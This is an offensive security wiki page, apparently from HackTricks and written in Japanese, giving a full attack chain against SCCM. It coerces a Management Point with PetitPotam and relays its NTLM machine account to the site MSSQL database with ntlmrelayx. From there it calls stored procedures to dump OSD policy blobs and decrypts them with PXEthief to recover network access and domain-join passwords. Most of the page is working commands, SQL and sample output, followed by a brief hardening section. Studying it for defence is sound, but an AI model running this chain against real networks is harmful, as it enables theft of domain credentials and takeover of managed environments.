# SCCM Management Point NTLM Relay to SQL – OSDポリシーシークレット抽出

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
**System Center Configuration Manager (SCCM) Management Point (MP)**をSMB/RPC経由で認証させ、そのNTLMマシンアカウントを**サイトデータベース (MSSQL)**にリレーすることで、`smsdbrole_MP` / `smsdbrole_MPUserSvc`権限を取得します。これらのロールを使用すると、**Operating System Deployment (OSD)**ポリシーブロブ（ネットワークアクセスアカウントの資格情報、タスクシーケンス変数など）を公開する一連のストアドプロシージャを呼び出すことができます。ブロブは16進数でエンコード/暗号化されていますが、**PXEthief**を使用してデコードおよび復号化でき、平文のシークレットが得られます。

高レベルのチェーン:
1. MP & サイトDBを発見 ↦ 認証されていないHTTPエンドポイント`/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`を開始。
3. **PetitPotam**、PrinterBug、DFSCoerceなどを使用してMPを強制。
4. SOCKSプロキシを介して、リレーされた**<DOMAIN>\\<MP-host>$**アカウントとして`mssqlclient.py -windows-auth`で接続。
5. 実行:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   （または`MP_GetPolicyBodyAfterAuthorization`）
6. `0xFFFE` BOMを削除し、`xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。

`OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password`などのシークレットは、PXEやクライアントに触れることなく回収されます。

---

## 1. 認証されていないMPエンドポイントの列挙
MP ISAPI拡張機能**GetAuth.dll**は、認証を必要としないいくつかのパラメータを公開しています（サイトがPKI専用でない限り）:

| パラメータ | 目的 |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | サイト署名証明書の公開鍵 + *x86* / *x64* **すべての不明なコンピュータ**デバイスのGUIDを返します。 |
| `MPLIST` | サイト内のすべてのManagement-Pointをリストします。 |
| `SITESIGNCERT` | プライマリサイト署名証明書を返します（LDAPなしでサイトサーバーを特定）。 |

後のDBクエリのために**clientID**として機能するGUIDを取得します:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. MPマシンアカウントをMSSQLに中継する
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
強制が発生すると、次のようなものが表示されるはずです:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. ストアドプロシージャを介してOSDポリシーを特定する
SOCKSプロキシ（デフォルトでポート1080）を介して接続します：
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
**CM_<SiteCode>** DBに切り替えます（3桁のサイトコードを使用します。例：`CM_001`）。

### 3.1 不明なコンピュータGUIDを見つける（オプション）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2 割り当てられたポリシーのリスト
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
各行には `PolicyAssignmentID`、`Body` (16進数)、`PolicyID`、`PolicyVersion` が含まれています。

ポリシーに焦点を当てます：
* **NAAConfig**  – ネットワークアクセスアカウントの資格情報
* **TS_Sequence** – タスクシーケンス変数 (OSDJoinAccount/Password)
* **CollectionSettings** – 実行アカウントを含む可能性があります

### 3.3  完全なボディを取得する
`PolicyID` と `PolicyVersion` が既にある場合は、次のようにして clientID の要件をスキップできます：
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 重要: SSMSで「最大取得文字数」を増やす（>65535）さもなければ、blobが切り捨てられます。

---

## 4. blobをデコードおよび復号化する
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
回復された秘密の例:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 関連するSQLロールと手続き
リレー時にログインは次のようにマッピングされます：
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

これらのロールは数十のEXEC権限を公開しており、この攻撃で使用される主要なものは次のとおりです：

| ストアドプロシージャ | 目的 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID`に適用されるポリシーのリスト。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 完全なポリシー本体を返します。 |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA`パスによって返されます。 |

完全なリストを確認するには：
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. 検出と強化
1. **MPログインの監視** – ホストではないIPからログインしているMPコンピュータアカウントは≈リレー。
2. サイトデータベースで**認証のための拡張保護 (EPA)**を有効にする（`PREVENT-14`）。
3. 使用していないNTLMを無効にし、SMB署名を強制し、RPCを制限する（`PetitPotam`/`PrinterBug`に対して使用される同じ緩和策）。
4. IPSec / 相互TLSでMP ↔ DB通信を強化する。

---

## 参照
* NTLMリレーの基本：
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQLの悪用とポストエクスプロイト：
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## 参考文献
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
